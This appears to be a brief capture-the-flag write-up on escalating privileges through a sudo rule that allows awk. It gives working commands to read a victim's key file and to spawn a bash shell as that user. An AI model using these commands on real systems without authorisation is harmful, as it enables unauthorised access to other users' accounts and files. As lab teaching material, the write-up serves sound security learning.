**GOAL**: To retrieve the key using privileges escalation based on misconfigurations of the sudo command.

## Solution
1. Logging into the instance, we look at what we can run using sudo.
2. We see that we can run `awk` with sudo privilege
3. With the help of `awk` command we can:
- just using the command to read the file containing the key.
- use the command to get a shell as the victim
4.  Reading the file can be done directly by specifying the file's path on the command line after the command:
```
awk '{print $1}' /home/victim/key.txt
```
5. To gain a shell as the user victim, you can use the following command:
```
awk 'BEGIN {system("/bin/bash")}'
```
